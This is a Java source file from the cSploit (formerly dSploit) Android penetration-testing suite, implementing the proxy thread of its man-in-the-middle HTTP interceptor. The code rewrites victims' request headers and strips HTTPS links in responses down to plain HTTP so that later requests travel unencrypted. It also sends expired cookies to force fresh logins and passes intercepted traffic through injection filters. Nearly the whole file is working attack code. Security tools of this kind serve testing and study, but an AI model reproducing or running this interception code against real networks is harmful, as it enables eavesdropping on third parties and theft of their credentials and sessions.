/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.net.http.proxy;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import org.csploit.android.core.Logger;
import org.csploit.android.core.Profiler;
import org.csploit.android.core.System;
import org.csploit.android.net.http.RequestParser;
import org.csploit.android.net.http.proxy.Proxy.OnRequestListener;

public class ProxyThread extends Thread
{
  private final static int MAX_REQUEST_SIZE = 8192;
  private final static int HTTP_SERVER_PORT = 80;
  private final static int HTTPS_SERVER_PORT = 443;
  private final static Pattern LINK_PATTERN = Pattern.compile("(https://[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)", Pattern.CASE_INSENSITIVE);

  private Socket mSocket = null;
  private BufferedOutputStream mWriter = null;
  private InputStream mReader = null;
  private String mServerName = null;
  private Socket mServer = null;
  private InputStream mServerReader = null;
  private OutputStream mServerWriter = null;
  private OnRequestListener mRequestListener = null;
  private ArrayList<Proxy.ProxyFilter> mFilters = null;
  private String mHostRedirect = null;
  private int mPortRedirect = 80;
  private SocketFactory mSocketFactory = null;

  public ProxyThread(Socket socket, OnRequestListener listener, ArrayList<Proxy.ProxyFilter> filters, String hostRedirection, int portRedirection) throws IOException{
    super("ProxyThread");

    mSocket = socket;
    mWriter = null;
    mReader = mSocket.getInputStream();
    mRequestListener = listener;
    mFilters = filters;
    mHostRedirect = hostRedirection;
    mPortRedirect = portRedirection;
    mSocketFactory = SSLSocketFactory.getDefault();
  }

  public void run(){

    try{
      // Apache's default header limit is 8KB.
      byte[] buffer = new byte[MAX_REQUEST_SIZE];
      int read = 0;

      final String client = mSocket.getInetAddress().getHostAddress();

      Logger.debug("Connection from " + client);

      Profiler.instance().profile("proxy request read");

      // Read the header and rebuild it
      if((read = mReader.read(buffer, 0, MAX_REQUEST_SIZE)) > 0){
        Profiler.instance().profile("proxy request parse");

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buffer, 0, read);
        BufferedReader bReader = new BufferedReader(new InputStreamReader(byteArrayInputStream));
        StringBuilder builder = new StringBuilder();
        String line = null;
        ArrayList<String> headers = new ArrayList<String>();
        boolean headersProcessed = false;

        while((line = bReader.readLine()) != null){
          if(headersProcessed == false){
            headers.add(line);

            // \r\n\r\n received ?
            if(line.trim().isEmpty())
              headersProcessed = true;
              // Set protocol version to 1.0 since we don't support chunked transfer encoding ( yet )
            else if(line.contains("HTTP/1.1"))
              line = line.replace("HTTP/1.1", "HTTP/1.0");
              // Fix headers
            else if(line.indexOf(':') != -1){
              String[] split = line.split(":", 2);
              String header = split[0].trim(),
                value = split[1].trim();

              // Set encoding to identity since we are not handling gzipped streams
              if(header.equals(RequestParser.ACCEPT_ENCODING_HEADER))
                value = "identity";
                // Can't easily handle keep alive connections with blocking sockets
              else if(header.equals(RequestParser.CONNECTION_HEADER))
                value = "close";
                // Keep requesting fresh files and ignore any cache instance
              else if(header.equals(RequestParser.IF_MODIFIED_SINCE_HEADER) || header.equals(RequestParser.CACHE_CONTROL_HEADER))
                header = null;
                // Extract the real request target.
              else if(header.equals(RequestParser.HOST_HEADER))
                mServerName = mHostRedirect == null ? value : mHostRedirect;

              if(header != null)
                line = header + ": " + value;
            }
          }

          // build the patched request
          builder.append(line + "\n");
        }

        // any real host found ?
        if(mServerName != null){
          Profiler.instance().profile("getUrlFromRequest");

          long millis = java.lang.System.currentTimeMillis();
          Logger.debug("Connection to " + mServerName);

          String request = builder.toString(),
            url = RequestParser.getUrlFromRequest(mServerName, request),
            response = null;
          boolean https = false;

          Profiler.instance().profile("DNS Resolution");

          // connect to host
          if(mHostRedirect == null){
            if(url != null && System.getSettings().getBoolean("PREF_HTTPS_REDIRECT", true) == true && HTTPSMonitor.getInstance().hasURL(client, url) == true){
              Logger.warning("Found stripped HTTPS url : " + url);

              if(CookieCleaner.getInstance().isClean(client, mServerName, request) == false){
                Logger.warning("Sending expired cookie for " + mServerName);

                response = CookieCleaner.getInstance().getExpiredResponse(request, mServerName);

                CookieCleaner.getInstance().addCleaned(client, mServerName);
              }

              https = true;
              mServer = DNSCache.getInstance().connect(mSocketFactory, mServerName, HTTPS_SERVER_PORT);
            }
            else{
              mServer = DNSCache.getInstance().connect(mServerName, HTTP_SERVER_PORT);

              Logger.debug(client + " > " + mServerName + " [�" + (java.lang.System.currentTimeMillis() - millis) + " ms ]");

              millis = java.lang.System.currentTimeMillis();
            }
          }
          // just redirect requests
          else
            mServer = DNSCache.getInstance().connect(mServerName, mPortRedirect);

          if(mRequestListener != null){
            Profiler.instance().profile("onRequest handler");

            mRequestListener.onRequest(https, client, mServerName, headers);
          }

          mWriter = new BufferedOutputStream(mSocket.getOutputStream());

          if(response != null){
            mWriter.write(response.getBytes());
            mWriter.flush();
            mWriter.close();
          } else{
            mServerReader = mServer.getInputStream();
            mServerWriter = mServer.getOutputStream();

            Profiler.instance().profile("request write");

            // send the patched request
            mServerWriter.write(request.getBytes());
            mServerWriter.flush();

            Profiler.instance().profile("StreamThread");

            // start the stream session with specified filters
            new StreamThread(client, mServerReader, mWriter, new Proxy.ProxyFilter(){
              @Override
              public String onDataReceived(String headers, String data){
                if(System.getSettings().getBoolean("PREF_HTTPS_REDIRECT", true) == true){
                  // first of all, get rid of every HTTPS url
                  Matcher match = LINK_PATTERN.matcher(data);
                  if(match != null){
                    while(match.find()){
                      String url = match.group(1),
                        stripped = url.replace("https://", "http://").replace("&amp;", "&");

                      data = data.replace(url, stripped);

                      HTTPSMonitor.getInstance().addURL(client, stripped);
                    }
                  }
                }

                // apply each provided filter
                for(Proxy.ProxyFilter filter : mFilters){
                  data = filter.onDataReceived(headers, data);
                }

                return data;
              }
            });

            Profiler.instance().emit();
          }
        }
      }
      else{
        mReader.close();
      }
    }
    catch(IOException e){ }
  }
}